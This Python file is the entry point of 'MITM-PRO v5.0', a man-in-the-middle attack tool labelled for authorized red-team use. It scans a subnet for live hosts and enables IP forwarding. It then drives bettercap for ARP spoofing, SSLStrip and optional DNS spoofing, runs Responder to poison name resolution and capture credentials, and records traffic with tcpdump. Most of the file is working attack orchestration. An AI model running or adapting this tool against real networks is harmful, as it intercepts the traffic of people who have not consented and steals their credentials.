#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════
# MITM-PRO v5.0 — Bettercap Core Edition
# Enterprise Red Team / Pentest — Authorized Internal Exercise ONLY
# Author: Đoàn Khánh
# ═══════════════════════════════════════════════════════════════

"""
Entry point chính.
Flow: parse args → load config → check deps → wizard / CLI → confirm → run
"""

import argparse
import ipaddress
import logging
import os
import shutil
import signal
import subprocess
import sys
import threading
import time
from pathlib import Path

# Đảm bảo import từ thư mục project
sys.path.insert(0, str(Path(__file__).resolve().parent))

from rich.console import Console
from rich.live import Live
from rich.prompt import Confirm

from core.bettercap_engine import BettercapEngine
from ui.dashboard import make_dashboard, show_banner
from utils.cleanup import full_cleanup
from utils.config import Config, State, check_dependencies
from utils.logger import setup_logging

console = Console()
STOP_EVENT = threading.Event()

# Biến global giữ reference để cleanup
_engine: BettercapEngine = None  # type: ignore
_responder_proc: subprocess.Popen = None  # type: ignore
_tcpdump_proc: subprocess.Popen = None  # type: ignore
_cfg: Config = None  # type: ignore
_state: State = None  # type: ignore


# ─── Signal handler ──────────────────────────────────────────────────

def _signal_handler(sig, frame):
    STOP_EVENT.set()


# ─── Validate IP / CIDR ─────────────────────────────────────────────

def _validate_ip(ip: str) -> bool:
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False


def _validate_cidr(cidr: str) -> bool:
    try:
        ipaddress.ip_network(cidr, strict=False)
        return True
    except ValueError:
        return False


# ─── Scan live hosts (dùng bettercap net.probe hoặc fallback nmap) ───

def scan_live_hosts_arp(iface: str, cidr: str, max_targets: int) -> list:
    """Quét nhanh host sống bằng nmap -sn (ping scan) — không cần scapy."""
    logging.info(f"🔍 Quét host sống trong {cidr}...")

    # Ưu tiên nmap nếu có
    if shutil.which("nmap"):
        try:
            result = subprocess.run(
                ["nmap", "-sn", "-n", cidr, "-oG", "-"],
                capture_output=True, text=True, timeout=30,
            )
            hosts = []
            for line in result.stdout.splitlines():
                if "Host:" in line and "Status: Up" in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        ip = parts[1]
                        if _validate_ip(ip):
                            hosts.append(ip)
            if len(hosts) > max_targets:
                hosts = hosts[:max_targets]
                logging.warning(f"⚠️ Giới hạn {max_targets} target (safety)")
            logging.info(f"   Tìm thấy {len(hosts)} host sống")
            return hosts
        except Exception as e:
            logging.warning(f"⚠️ nmap thất bại: {e}")

    # Fallback: arp-scan
    if shutil.which("arp-scan"):
        try:
            result = subprocess.run(
                ["arp-scan", "-I", iface, cidr, "-q"],
                capture_output=True, text=True, timeout=30,
            )
            hosts = []
            for line in result.stdout.splitlines():
                parts = line.split()
                if parts and _validate_ip(parts[0]):
                    hosts.append(parts[0])
            if len(hosts) > max_targets:
                hosts = hosts[:max_targets]
            return hosts
        except Exception as e:
            logging.warning(f"⚠️ arp-scan thất bại: {e}")

    logging.error("❌ Cần cài nmap hoặc arp-scan để quét mạng")
    return []


# ─── Interactive Wizard ──────────────────────────────────────────────

def interactive_wizard(cfg: Config, state: State):
    """Hỏi người dùng từng bước nếu thiếu tham số CLI."""
    console.print("\n[bold cyan]═══ Interactive Wizard ═══[/]\n")

    state.iface = console.input("🌐 Interface [dim](mặc định eth0)[/]: ").strip() or cfg.interface
    state.gw = console.input("🔴 Gateway IP: ").strip()

    while not _validate_ip(state.gw):
        console.print("[red]   IP không hợp lệ, nhập lại![/]")
        state.gw = console.input("🔴 Gateway IP: ").strip()

    choice = console.input("🎯 Chọn cách nhập target — [bold]1[/]=Nhập IP  |  [bold]2[/]=Quét CIDR: ").strip()

    if choice == "1":
        raw = console.input("   IPs (cách nhau bởi dấu phẩy): ").strip()
        targets = [t.strip() for t in raw.split(",") if t.strip() and _validate_ip(t.strip())]
    else:
        cidr = console.input("   CIDR (vd: 192.168.1.0/24): ").strip()
        while not _validate_cidr(cidr):
            console.print("[red]   CIDR không hợp lệ![/]")
            cidr = console.input("   CIDR: ").strip()
        targets = scan_live_hosts_arp(state.iface, cidr, cfg.max_targets)

    # Loại bỏ gateway khỏi danh sách target
    state.targets = [t for t in targets if t != state.gw]

    # Hỏi mode
    mode = console.input("⚡ Mode [dim](safe/normal/aggressive, mặc định safe)[/]: ").strip().lower()
    if mode in ("safe", "normal", "aggressive"):
        state.mode = mode
    else:
        state.mode = cfg.mode


# ─── Start Responder ─────────────────────────────────────────────────

def start_responder(cfg: Config, state: State) -> subprocess.Popen:
    """Chạy Responder nếu có sẵn."""
    if not shutil.which("responder"):
        logging.warning("⚠️ Responder không có — bỏ qua")
        return None

    logging.info("🐸 Khởi động Responder...")
    log_fd = open(cfg.res_log, "w")
    proc = subprocess.Popen(
        ["responder", "-I", state.iface, "-wrf", "--lm", "-v"],
        stdout=log_fd, stderr=subprocess.STDOUT,
    )
    logging.info(f"   Responder PID: {proc.pid}")
    state.responder_pid = proc.pid
    return proc


# ─── Start tcpdump (backup PCAP ngoài bettercap) ─────────────────────

def start_tcpdump(cfg: Config, state: State) -> subprocess.Popen:
    """PCAP backup bằng tcpdump (song song với net.sniff của bettercap)."""
    tcpdump_pcap = cfg.output_dir / "tcpdump_capture.pcap"
    logging.info(f"📡 tcpdump backup → {tcpdump_pcap}")
    proc = subprocess.Popen(
        ["tcpdump", "-i", state.iface, "-w", str(tcpdump_pcap), "-U", "-q"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    return proc


# ─── Main ────────────────────────────────────────────────────────────

def main():
    global _engine, _responder_proc, _tcpdump_proc, _cfg, _state

    # 1. Load config mặc định từ YAML
    _cfg = Config.from_yaml()
    _state = State()

    # 2. Parse CLI args
    parser = argparse.ArgumentParser(
        description=f"MITM-PRO v{_cfg.version} — Bettercap Core Edition",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Ví dụ:\n  sudo python3 mitm_pro.py -i eth0 -g 192.168.1.1 -R 192.168.1.0/24 --mode normal"
    )
    parser.add_argument("-i", "--interface", help="Network interface (mặc định: eth0)")
    parser.add_argument("-g", "--gateway", help="Gateway IP")
    parser.add_argument("-R", "--range", help="CIDR range để quét target")
    parser.add_argument("-T", "--targets", help="Danh sách IP cách nhau bằng dấu phẩy")
    parser.add_argument("-o", "--outdir", default=str(_cfg.output_dir), help="Thư mục output")
    parser.add_argument("--mode", choices=["safe", "normal", "aggressive"], default=None,
                        help="Chế độ tấn công (safe/normal/aggressive)")
    parser.add_argument("--max-targets", type=int, default=None, help=f"Giới hạn target (mặc định: {_cfg.max_targets})")
    parser.add_argument("--no-report", action="store_true", help="Tắt tạo report khi kết thúc")
    parser.add_argument("--no-responder", action="store_true", help="Không chạy Responder")
    parser.add_argument("--no-sslstrip", action="store_true", help="Tắt SSLStrip")
    parser.add_argument("--dns-spoof", action="store_true", help="Bật DNS spoofing")
    parser.add_argument("--dns-domains", help="Domain cần spoof (vd: *.corp.local)")
    parser.add_argument("--dns-address", help="IP trả về cho DNS spoof")
    parser.add_argument("--dry-run", action="store_true", help="Chạy thử, không tấn công thật")
    parser.add_argument("--api-port", type=int, default=None, help="Port REST API bettercap")
    parser.add_argument("--config", type=str, default=None, help="Đường dẫn file YAML config tùy chỉnh")
    args = parser.parse_args()

    # 3. Nếu có --config riêng, load lại
    if args.config:
        _cfg = Config.from_yaml(Path(args.config))

    # 4. Override config bằng CLI args
    if args.mode:
        _cfg.mode = args.mode
    if args.max_targets is not None:
        _cfg.max_targets = args.max_targets
    if args.no_report:
        _cfg.enable_report = False
    if args.no_responder:
        _cfg.responder = False
    if args.no_sslstrip:
        _cfg.sslstrip = False
    if args.dns_spoof:
        _cfg.dns_spoof = True
    if args.dns_domains:
        _cfg.dns_domains = args.dns_domains
    if args.dns_address:
        _cfg.dns_address = args.dns_address
    if args.api_port:
        _cfg.api_port = args.api_port
    _cfg.dry_run = args.dry_run
    _cfg.output_dir = Path(args.outdir)

    # 5. Setup paths & logging
    _cfg.setup_paths()
    setup_logging(_cfg.log_file)
    show_banner(_cfg.version)

    # 6. Check platform & quyền
    if sys.platform != "linux":
        logging.error("❌ MITM-PRO yêu cầu Linux!")
        sys.exit(1)
    if os.geteuid() != 0:
        logging.error("❌ Chạy bằng sudo!")
        sys.exit(1)

    # 7. Check dependencies
    check_dependencies()

    # 8. Xác định target (CLI hoặc Wizard)
    if args.gateway and (args.range or args.targets):
        # CLI mode đầy đủ
        _state.iface = args.interface or _cfg.interface
        _state.gw = args.gateway

        if not _validate_ip(_state.gw):
            logging.error(f"❌ Gateway IP không hợp lệ: {_state.gw}")
            sys.exit(1)

        if args.range:
            if not _validate_cidr(args.range):
                logging.error(f"❌ CIDR không hợp lệ: {args.range}")
                sys.exit(1)
            _state.targets = scan_live_hosts_arp(_state.iface, args.range, _cfg.max_targets)
        else:
            raw_targets = [t.strip() for t in args.targets.split(",") if t.strip()]
            _state.targets = [t for t in raw_targets if _validate_ip(t) and t != _state.gw]
    else:
        # Interactive Wizard
        interactive_wizard(_cfg, _state)

    _state.mode = _cfg.mode

    # 9. Validate
    if not _state.targets:
        logging.error("❌ Không có target nào!")
        sys.exit(1)

    if len(_state.targets) > _cfg.max_targets:
        _state.targets = _state.targets[:_cfg.max_targets]
        logging.warning(f"⚠️ Giới hạn {_cfg.max_targets} target (safety)")

    # 10. Tóm tắt trước khi chạy
    console.print(f"\n[bold]Interface:[/] [cyan]{_state.iface}[/]")
    console.print(f"[bold]Gateway:[/]   [yellow]{_state.gw}[/]")
    console.print(f"[bold]Targets:[/]   [green]{len(_state.targets)}[/] host(s)")
    console.print(f"[bold]Mode:[/]      [red]{_state.mode.upper()}[/]")
    console.print(f"[bold]Output:[/]    {_cfg.output_dir}\n")

    # 11. Dry-run?
    if _cfg.dry_run:
        logging.info("🧪 DRY-RUN — Không thực hiện tấn công thật")
        console.print("[bold yellow]Dry-run hoàn tất — không có hành động nào được thực thi.[/]")
        return

    # 12. Xác nhận
    if not Confirm.ask(
        f"[bold red]🚀 BẮT ĐẦU ATTACK với {len(_state.targets)} target(s)?[/]",
        default=False,
    ):
        logging.info("Người dùng đã huỷ")
        sys.exit(0)

    # 13. Bật IP forwarding
    orig = subprocess.run(
        ["sysctl", "-n", "net.ipv4.ip_forward"],
        capture_output=True, text=True,
    )
    _state.orig_ip_forward = orig.stdout.strip() or "0"
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
    logging.info("🔀 IP forwarding = 1")

    _state.start_time = time.time()

    # 14. Khởi động bettercap engine
    _engine = BettercapEngine(_cfg, _state)
    bettercap_proc = _engine.start_process()

    if not _engine.wait_api_ready(timeout=25):
        logging.error("❌ Bettercap không khởi động được — thoát")
        full_cleanup(_cfg, _state, bettercap_proc=bettercap_proc)
        sys.exit(1)

    _engine.setup_modules()

    # 15. Khởi động Responder (nếu bật)
    _responder_proc = None
    if _cfg.responder:
        _responder_proc = start_responder(_cfg, _state)

    # 16. Khởi động tcpdump backup
    _tcpdump_proc = start_tcpdump(_cfg, _state)

    # 17. Dashboard loop
    logging.info("📊 Dashboard đang chạy — Ctrl+C để dừng")
    with Live(
        make_dashboard(_cfg, _state),
        refresh_per_second=1.5,
        screen=True,
        console=console,
    ) as live:
        try:
            while not STOP_EVENT.is_set():
                # Lấy thông tin từ bettercap API
                lan_hosts = _engine.get_lan_hosts()
                events = _engine.get_events(count=30)

                live.update(make_dashboard(_cfg, _state, lan_hosts=lan_hosts, events=events))
                time.sleep(1.5)

                # Kiểm tra bettercap còn sống không
                if not _engine.is_alive():
                    logging.error("❌ Bettercap đã dừng bất ngờ!")
                    break
        except KeyboardInterrupt:
            pass

    # 18. Cleanup
    _engine.stop()
    full_cleanup(
        _cfg, _state,
        bettercap_proc=bettercap_proc,
        responder_proc=_responder_proc,
        tcpdump_proc=_tcpdump_proc,
    )


if __name__ == "__main__":
    signal.signal(signal.SIGINT, _signal_handler)
    signal.signal(signal.SIGTERM, _signal_handler)
    main()
